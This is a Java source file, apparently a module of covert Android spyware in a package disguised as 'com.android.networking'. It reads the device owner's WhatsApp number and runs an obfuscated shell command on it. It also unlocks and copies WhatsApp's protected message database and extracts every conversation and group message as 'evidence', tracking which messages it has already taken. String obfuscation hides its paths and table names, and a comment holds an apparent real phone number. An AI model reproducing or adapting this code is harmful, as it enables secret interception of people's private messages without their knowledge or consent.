package com.android.networking.module.chat;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashSet;
import java.util.Hashtable;
import java.util.Set;
import java.util.concurrent.Semaphore;

import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQueryBuilder;
import android.util.Pair;

import com.android.networking.Messages;
import com.android.networking.ProcessStatus;
import com.android.networking.auto.Cfg;
import com.android.networking.db.GenericSqliteHelper;
import com.android.networking.db.RecordVisitor;
import com.android.networking.evidence.Markup;
import com.android.networking.file.Path;
import com.android.networking.listener.ListenerProcess;
import com.android.networking.module.ModuleAddressBook;
import com.android.networking.util.Check;
import com.android.networking.util.StringUtils;

public class ChatWhatsapp extends SubModuleChat {
	private static final String TAG = "ChatWhatsapp";

	final Hashtable<String, String> groups = new Hashtable<String, String>();

	Hashtable<String, Integer> hastableConversationLastIndex = new Hashtable<String, Integer>();
	private static final int PROGRAM_WHATSAPP = 0x06;

	private static final String DEFAULT_LOCAL_NUMBER = "local";
	String pObserving = "whatsapp";

	private String myPhoneNumber = "local";
	Semaphore readChatSemaphore = new Semaphore(1, true);

	@Override
	int getProgramId() {
		return PROGRAM_WHATSAPP;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (notification stop)");
		}

		try {
			readChatMessages();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		}

	}

	/**
	 * Estrae dal file RegisterPhone.xml il numero di telefono
	 * 
	 * @return
	 */
	@Override
	protected void start() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStart)");
		}
		hastableConversationLastIndex = new Hashtable<String, Integer>();
		try {
			myPhoneNumber = readMyPhoneNumber();
			if (DEFAULT_LOCAL_NUMBER.equals(myPhoneNumber)) {
				enabled = false;
				return;
			}

			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WHATSAPP, myPhoneNumber);

			if (markup.isMarkup()) {
				hastableConversationLastIndex = (Hashtable<String, Integer>) markup.readMarkupSerializable();
				Enumeration<String> keys = hastableConversationLastIndex.keys();

				while (keys.hasMoreElements()) {
					String key = keys.nextElement();
					if (Cfg.DEBUG) {
						Check.log(TAG + " (actualStart): " + key + " -> " + hastableConversationLastIndex.get(key));
					}
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (actualStart), get all Chats");
				}

				readChatMessages();
			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart), " + e);
			}
		}

	}

	private String readMyPhoneNumber() {
		// f_d=/data/data/com.whatsapp/shared_prefs/RegisterPhone.xml
		/*
		 * <?xml version='1.0' encoding='utf-8' standalone='yes' ?> <map>
		 * <string
		 * name="com.whatsapp.RegisterPhone.phone_number">3938980634</string>
		 * <int name="com.whatsapp.RegisterPhone.country_code_position"
		 * value="-1" /> <boolean name="com.whatsapp.RegisterPhone.no_self_send"
		 * value="false" /> <int
		 * name="com.whatsapp.RegisterPhone.verification_state" value="14" />
		 * <int name="com.whatsapp.RegisterPhone.phone_number_position"
		 * value="10" /> <string
		 * name="com.whatsapp.RegisterPhone.input_country_code">39</string>
		 * <string name="com.whatsapp.RegisterPhone.input_phone_number">393 898
		 * 0634</string> <string
		 * name="com.whatsapp.RegisterPhone.prev_country_code">39</string>
		 * <string name="com.whatsapp.RegisterPhone.country_code">39</string>
		 * <string
		 * name="com.whatsapp.RegisterPhone.prev_phone_number">3938980634
		 * </string> </map>
		 */

		String filename = Messages.getString("f_d");
		try {
			Runtime.getRuntime().exec(Messages.getString("f_2") + filename);
			File file = new File(filename);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyPhoneNumber): " + file.getAbsolutePath());
			}

			Document doc = DocumentBuilderFactory.newInstance().newDocumentBuilder().parse(file);
			// Element root = doc.getDocumentElement();
			// root.getElementsByTagName("string");

			doc.getDocumentElement().normalize();
			NodeList stringNodes = doc.getElementsByTagName("string");
			for (int i = 0; i < stringNodes.getLength(); i++) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readMyPhoneNumber), node: " + i);
				}
				Node node = stringNodes.item(i);
				NamedNodeMap attrs = node.getAttributes();
				Node item = attrs.getNamedItem("name");
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readMyPhoneNumber), item: " + item.getNodeName() + " = " + item.getNodeValue());
				}
				// f_e=com.whatsapp.RegisterPhone.phone_number
				if (item != null && Messages.getString("f_e").equals(item.getNodeValue())) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readMyPhoneNumber), found: " + item);
					}
					String myPhone = node.getFirstChild().getNodeValue();
					return myPhone;
				}
			}

		} catch (Exception e) {

			if (Cfg.DEBUG) {
				Check.log(TAG + " (readMyPhoneNumber), ERROR: " + e);
			}
		}

		return DEFAULT_LOCAL_NUMBER;
	}

	// select messages._id,chat_list.key_remote_jid,key_from_me,data from
	// chat_list,messages where chat_list.key_remote_jid =
	// messages.key_remote_jid

	/**
	 * Apre msgstore.db, estrae le conversazioni. Per ogni conversazione legge i
	 * messaggi relativi
	 * 
	 * @throws IOException
	 */
	private void readChatMessages() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages)");
		}

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages), semaphore red");
			}
			return;
		}

		try {
			boolean updateMarkup = false;

			// f.0=/data/data/com.whatsapp/databases
			String dbDir = Messages.getString("f_0");
			// f.1=/msgstore.db
			String dbFile = Messages.getString("f_1");

			if (Path.unprotect(dbDir, dbFile, true)) {

				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages): can read DB");
				}
				GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
				SQLiteDatabase db = helper.getReadableDatabase();

				// retrieve a list of all the conversation changed from the last
				// reading. Each conversation contains the peer and the last id
				ArrayList<Pair<String, Integer>> changedConversations = fetchChangedConversation(db);

				// for every conversation, fetch and save message and update
				// markup
				for (Pair<String, Integer> pair : changedConversations) {
					String conversation = pair.first;
					int lastReadIndex = pair.second;

					if (isGroup(conversation) && groupTo(conversation) == null) {
						fetchGroup(db, conversation);
					}

					int newLastRead = fetchMessages(db, conversation, lastReadIndex);

					if (Cfg.DEBUG) {
						Check.log(TAG + " (readChatMessages): fetchMessages " + conversation + ":" + lastReadIndex
								+ " newLastRead " + newLastRead);
					}
					hastableConversationLastIndex.put(conversation, newLastRead);
					if (Cfg.DEBUG) {
						Check.asserts(hastableConversationLastIndex.get(conversation) > 0,
								" (readChatMessages) Assert failed, zero index");
					}
					updateMarkup = true;
				}

				if (updateMarkup) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readChatMessages): updating markup");
					}
					markup.writeMarkupSerializable(hastableConversationLastIndex);
				}

				db.close();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readChatMessages) Error, file not readable: " + dbFile);
				}
			}
		} finally {
			readChatSemaphore.release();
		}
	}

	private void fetchGroup(SQLiteDatabase db, final String conversation) {

		// f.4=_id
		// f.5=key_remote_jid
		// f_f=remote_resources
		String[] projection = { Messages.getString("f_4"), Messages.getString("f_f") };
		String selection = Messages.getString("f_5") + "='" + conversation + "'";

		// final Set<String> remotes = new HashSet<String>();

		RecordVisitor visitor = new RecordVisitor(projection, selection) {

			@Override
			public long cursor(Cursor cursor) {
				int id = cursor.getInt(0);
				String remote = cursor.getString(1);
				// remotes.add(remote);
				if (remote != null) {
					groups.put(conversation, clean(remote));
				}
				return id;
			}
		};

		GenericSqliteHelper helper = new GenericSqliteHelper(db);
		// f_a = messages
		helper.traverseRecords(Messages.getString("f_a"), visitor);

	}

	/**
	 * Retrieves the list of the conversations and their last read message.
	 * 
	 * @param db
	 * @return
	 */
	private ArrayList<Pair<String, Integer>> fetchChangedConversation(SQLiteDatabase db) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchChangedConversation)");
		}

		ArrayList<Pair<String, Integer>> changedConversations = new ArrayList<Pair<String, Integer>>();

		// CREATE TABLE chat_list (_id INTEGER PRIMARY KEY AUTOINCREMENT,
		// key_remote_jid TEXT UNIQUE, message_table_id INTEGER)

		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
		// f.3=chat_list
		queryBuilderIndex.setTables(Messages.getString("f_3"));
		// queryBuilder.appendWhere(inWhere);
		// f.4=_id
		// f.5=key_remote_jid
		// f.6=message_table_id
		String[] projection = { Messages.getString("f_4"), Messages.getString("f_5"), Messages.getString("f_6") };
		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);

		// iterate conversation indexes
		while (cursor != null && cursor.moveToNext()) {
			// f.5=key_remote_jid
			String jid = cursor.getString(cursor.getColumnIndexOrThrow(Messages.getString("f_5")));
			// f.6=message_table_id
			int mid = cursor.getInt(cursor.getColumnIndexOrThrow(Messages.getString("f_6")));
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readChatMessages): jid : " + jid + " mid : " + mid);
			}

			int lastReadIndex = 0;
			// if conversation is known, get the last read index
			if (hastableConversationLastIndex.containsKey(jid)) {

				lastReadIndex = hastableConversationLastIndex.get(jid);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchChangedConversation), I have the index: " + lastReadIndex);
				}
			}

			// if there's something new, fetch new messages and update
			// markup
			if (lastReadIndex < mid) {
				changedConversations.add(new Pair<String, Integer>(jid, lastReadIndex));
			}

		}
		cursor.close();
		return changedConversations;
	}

	/**
	 * Fetch unread messages of a specific conversation
	 * 
	 * @param db
	 * @param conversation
	 * @param lastReadIndex
	 * @return
	 */
	private int fetchMessages(SQLiteDatabase db, String conversation, int lastReadIndex) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (fetchMessages): " + conversation + " : " + lastReadIndex);
		}
		// CREATE TABLE messages (_id INTEGER PRIMARY KEY AUTOINCREMENT,
		// key_remote_jid TEXT NOT NULL, key_from_me INTEGER, key_id TEXT NOT
		// NULL, status INTEGER, needs_push INTEGER, data TEXT, timestamp
		// INTEGER, media_url TEXT, media_mime_type TEXT, media_wa_type TEXT,
		// media_size INTEGER, media_name TEXT, media_hash TEXT, latitude REAL,
		// longitude REAL, thumb_image TEXT, remote_resource TEXT,
		// received_timestamp INTEGER, send_timestamp INTEGER,
		// receipt_server_timestamp INTEGER, receipt_device_timestamp INTEGER,
		// raw_data BLOB)

		String peer = clean(conversation);

		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
		// f.a=messages
		queryBuilderIndex.setTables(Messages.getString("f_a"));
		// f.4=_id
		// f.5=key_remote_jid
		queryBuilderIndex.appendWhere(Messages.getString("f_5") + " = '" + conversation + "' AND "
				+ Messages.getString("f_4") + " > " + lastReadIndex);
		// f.7=data
		// f_b=timestamp
		// f_c=key_from_me
		String[] projection = { Messages.getString("f_4"), Messages.getString("f_5"), Messages.getString("f_7"),
				Messages.getString("f_b"), Messages.getString("f_c"), "remote_resource" };

		// SELECT _id,key_remote_jid,data FROM messages where _id=$conversation
		// AND key_remote_jid>$lastReadIndex
		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, Messages.getString("f_4"));

		ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
		int lastRead = lastReadIndex;
		while (cursor != null && cursor.moveToNext()) {
			int index = cursor.getInt(0); // f_4
			String message = cursor.getString(2); // f_7
			Long timestamp = cursor.getLong(3); // f_b
			boolean incoming = cursor.getInt(4) != 1; // f_c
			String remote = cursor.getString(5);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (fetchMessages): " + conversation + " : " + index + " -> " + message);
			}
			lastRead = Math.max(index, lastRead);

			if (StringUtils.isEmpty(message)) {
				if (isGroup(conversation) && !StringUtils.isEmpty(remote)) {
					if (Cfg.DEBUG) {
						Check.asserts(groupTo(conversation).contains(clean(remote)), "no remote in group: " + remote);
					}
				}
			} else {

				if (Cfg.DEBUG) {
					Check.log(TAG + " (fetchMessages): " + StringUtils.byteArrayToHexString(message.getBytes()));
				}
				String from = incoming ? peer : myPhoneNumber;
				String to = incoming ? myPhoneNumber : peer;

				if (isGroup(peer)) {
					if (incoming) {
						from = remote;
					} else {
						to = groupTo(peer);
					}
				}
				messages.add(new MessageChat(PROGRAM_WHATSAPP, new Date(timestamp), from, to, message, incoming));
			}

		}
		cursor.close();
		getModule().saveEvidence(messages);
		return lastRead;
	}

	private String clean(String remote) {
		// f_9=@s.whatsapp.net
		return remote.replaceAll(Messages.getString("f_9"), "");
	}

	private String groupTo(String peer) {
		return groups.get(peer);
	}

	private void addGroup(String peer, String remote) {
		if (Cfg.DEBUG) {
			Check.requires(isGroup(peer), "peer is not a group: " + peer);
		}
		String value;
		if (groups.containsKey(peer)) {
			value = groups.get(peer);
			value += "," + clean(remote);

		} else {
			value = remote;
		}

		groups.put(peer, value);
	}

	private boolean isGroup(String peer) {

		return peer.contains("@g.");
	}

}
